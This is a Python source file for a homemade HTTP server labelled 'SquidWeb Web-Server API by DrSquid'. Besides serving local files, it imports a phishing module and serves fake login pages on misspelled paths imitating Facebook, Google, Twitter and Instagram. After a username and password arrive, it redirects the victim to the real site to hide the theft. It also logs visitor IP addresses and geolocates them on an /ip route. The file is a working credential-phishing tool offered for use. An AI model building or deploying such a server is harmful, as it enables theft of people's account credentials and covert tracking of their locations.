import socket, threading, os, datetime
try:
    import PhishingPackets
except:
    pass
try:
    import geocoder
except:
    pass
class Website:
    def logo(self):
        return """
  _________            .__    ._____      __      ___.           ________       .________
 /   _____/ ________ __|__| __| _/  \    /  \ ____\_ |__   ___  _\_____  \      |   ____/
 \_____  \ / ____/  |  \  |/ __ |\   \/\/   // __ \| __ \  \  \/ //  ____/      |____  \ 
 /        < <_|  |  |  /  / /_/ | \        /\  ___/| \_\ \  \   //       \      /       \\
/_______  /\__   |____/|__\____ |  \__/\  /  \___  >___  /   \_/ \_______ \ /\ /______  /
        \/    |__|             \/       \/       \/    \/                \/ \/        \/ 
Web-Server API by DrSquid"""
    def __init__(self, IP, Port, external_ip=None, external_port=None):
        self.ip = IP
        self.port = int(Port)
        self.external_ip = external_ip
        self.external_port = external_port
        self.logfile = os.path.join(os.getcwd(),"squidweb_log.txt")
        try:
            log = open(self.logfile,"r")
        except:
            log = open(self.logfile,"w")
        log.close()
        self.log(self.logo(), havedate=False)
        self.log("[+] This project is still in development. Many problems still exist, and is not perfect.", havedate=False)
        self.og_dir = os.getcwd()
        self.filelist = []
        self.dirlist = []
        if self.external_ip is None:
            self.external_ip = self.ip
        if self.external_port is None:
            self.external_port = self.port
        try:
            self.phishing_packets = PhishingPackets.Phishing_Packets(self.external_ip, self.external_port)
        except Exception as e:
            pass
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.homepage = "/home"
        self.ipban_list = []
        if "index.html" not in os.listdir():
            file = open("index.html","w")
            file.write("""
<h1>Welcome!</h1>
Welcome to this website.
            """)
            file.close()
        self.subdomains = [["/home", "index.html"]]
    def log(self, item, havedate=True, display=True):
        try:
            file = open(self.logfile,"r")
            content = file.read()
            file.close()
            file = open(self.logfile,"w")
            if havedate:
                item = f"[({datetime.datetime.today()})][+] {item}"
            if display:
                print(item)
            file.write(f"{content}\n{item}")
            file.close()
        except Exception as e:
            file = open(self.logfile,"w")
            file.write(self.logo()+"\n")
            file.write(f"[({datetime.datetime.today()})][+] There was an error with logging: {e}\n[({datetime.datetime.today()})][+] Wiping log file as a precaution.")
            print(f"[({datetime.datetime.today()})][+] There was an error with logging: {e}\n[({datetime.datetime.today()})][+] Wiping log file as a precaution.")
    def obtain_dirs(self, dir):
        os.chdir(dir)
        dirs = os.listdir()
        for i in dirs:
            try:
                item = open(i,"rb")
                item.close()
                self.filelist.append(os.path.join(os.getcwd(),i))
            except:
                self.dirlist.append(os.path.join(os.getcwd(),i))
    def use_all_in_dir(self):
        self.obtain_dirs(os.getcwd())
        for i in self.dirlist:
            self.obtain_dirs(i)
        os.chdir(self.og_dir)
        for i in self.filelist:
            self.add_subdomain(i.replace("\\","/").replace(self.og_dir.replace("\\","/"),""),i)
    def recv_GET(self, request):
        try:
            return request.split()[1]
        except:
            return "/home"
    def start_server(self):
        self.server.bind((self.ip, self.port))
        self.listen()
    def listen(self):
        self.log(f"Server is listening on {self.ip}:{self.port}.")
        while True:
            try:
                self.server.listen()
                conn, ip = self.server.accept()
                req = conn.recv(1024).decode()
                handle = threading.Thread(target=self.handler, args=(conn, ip, req)).start()
            except Exception as e:
                self.log(f"Error Listening for connections: {e}")
    def add_subdomain(self, subdomain_name, file_with_content):
        valid_file = False
        try:
            file = open(file_with_content,"rb")
            file.close()
            if not subdomain_name.startswith("/"):
                subdomain_name = f"/{subdomain_name}"
            if self.found_conflict(subdomain_name):
                self.log(f"Subdomain Conflict Found: {subdomain_name}; Overriding the old version, and replacing with the current.")
                for i in self.subdomains:
                    if subdomain_name == i[0]:
                        self.subdomains.remove(i)
            self.subdomains.append([subdomain_name, file_with_content])
            self.log(f"New subdomain added: {subdomain_name} under file: {file_with_content}.")
        except Exception as e:
            self.log(f"Subdomain '{subdomain_name}' not added due to reasons: {e}")
    def found_conflict(self, subdomain):
        found_conflict = False
        for i in self.subdomains:
            if subdomain == i[0]:
                found_conflict = True
        return found_conflict
    def obtain_query_str(self, subdomain):
        try:
            split_item = subdomain.split("&")
            query_strs = []
            for i in split_item:
                try:
                    query_strs.append([i.split("/?")[1].split("=")[0], i.split("/?")[1].split("=")[1]])
                except:
                    query_strs.append([i.split("=")[0], i.split("=")[1]])
        except Exception as e:
            pass
        return query_strs
    def configure_server_dir(self, _dir):
        self.log(f"Attempting to change server directory to: {_dir}")
        try:
            os.chdir(_dir)
            self.og_dir = _dir
            if "index.html" not in os.listdir():
                file = open("index.html","w")
                file.write("""
    <h1>Welcome!</h1>
    Welcome to this website.
                """)
                file.close()
            self.log(f"Changed Server directory to: {self.og_dir}")
        except Exception as e:
            self.log(f"Unable to change the server directory due to error {e}")
    def return_real_subdomain(self, subdomain):
        domain = subdomain.split("/")
        del domain[0]
        new_domain = ""
        for i in domain:
            if "?" not in i:
                new_domain += f"/{i}"
        return  new_domain
    def response_to_send(self, subdomain, ip, query_str):
        code = "200 OK"
        found = False
        redirect_to_real_web = False
        webdomain = ""
        subdomain = self.return_real_subdomain(subdomain)
        for i in self.subdomains:
            if subdomain == i[0]:
                found = True
                file = open(i[1],"rb")
                content = file.read()
                file.close()
                return content, code
        """Only use the code in quotes if you want(simply get rid of the quotes)."""
        if not found:
            try:
                if "username" in query_str[0][0] and "password" in query_str[1][0]:
                    redirect_to_real_web = True
            except:
                pass
            if subdomain == "/":
                code = "301 Redirect"
                return f'<meta http-equiv="refresh" content="2;url=http://{self.external_ip}:{self.external_port}/home" />'.encode(), code
            elif subdomain == "/ip":
                extratext = ""
                try:
                    extratext = f"<br>Approximate Location: {geocoder.ip(ip).latlng}"
                except:
                    pass
                return f"<title>Your IP information!</title><h1>Hey there!</h1> This is your ip: {ip}{extratext}".encode(), code
            elif subdomain == "/facebok":
                webdomain = "facebook.com"
                if not redirect_to_real_web:
                    return self.phishing_packets.Facebook_packet().encode(), code
            elif subdomain == "/gogle":
                webdomain = "google.com"
                if not redirect_to_real_web:
                    return self.phishing_packets.google_packet().encode(), code
            elif subdomain == "/twtter":
                webdomain = "twitter.com"
                if not redirect_to_real_web:
                    return self.phishing_packets.twitter_packet().encode(), code
            elif subdomain == "/instgram":
                webdomain = "instagram.com"
                if not redirect_to_real_web:
                    return self.phishing_packets.instagram_packet().encode(), code
            if redirect_to_real_web:
                return f"""<meta http-equiv="Refresh" content="0; url='https://{webdomain}/'" />""".encode(), code
            code = "404 Not Found"
            return "<h1>Not Found</h1> Url requested was not found on the server.".encode(), code
    def obtain_actual_ip(self, msg, ip):
        ipaddr = ""
        item = 0
        for i in msg.split():
            if 'x-forwarded-for' in i.lower():
                ipaddr = msg.split()[item + 1]
                break
            else:
                ipaddr = ip
            item += 1
        return ipaddr
    def reformat_str(self, string):
        return str(string).replace("+", " ").replace("%3C", "<").replace("%3E", ">").replace(
        "%2F", "/").replace("%22", '"').replace("%27", "'").replace("%3D", "=").replace("%2B",
        "+").replace("%3A", ":").replace("%28", "(").replace("%29", ")").replace("%2C", ","
        ).replace("%3B", ";").replace("%20", " ").replace("%3F", "?").replace("%5C", "\\"
        ).replace("%7B", "{").replace("%7D", "}").replace("%24", "$").replace("%0D", "\n"
        ).replace("%0A", "   ").replace("%40","@")
    def handler(self, conn, ip, msg):
        try:
            subdomain = self.recv_GET(msg)
            actual_ip = self.obtain_actual_ip(msg, ip[0])
            query_strs = self.obtain_query_str(subdomain)
            code_and_response = self.response_to_send(subdomain, actual_ip, query_strs)
            code = code_and_response[1]
            print(code_and_response)
            conn.send(f'HTTP/1.0 {code}\n'.encode())
            conn.send('Content-Type: text/html\n'.encode())
            conn.send("\n".encode())
            conn.send(code_and_response[0])
            self.log(f"Connection: {actual_ip} - {ip} ---> {self.ip}:{self.port}{self.reformat_str(subdomain)} - HTTP/1.0 {code}")
            conn.close()
        except Exception as e:
            code = f"500 INTERNAL SERVER ERROR: {e}"
            self.log(f"Connection: {actual_ip} - {ip} ---> {self.ip}:{self.port}{self.reformat_str(subdomain)} - HTTP/1.0 {code}")
            try:
                conn.send("""
<h1>500 Internal Server Error</h1>
There was an error processing your request. We apologize for the inconvenience.""".encode())
                conn.close()
            except:
                pass
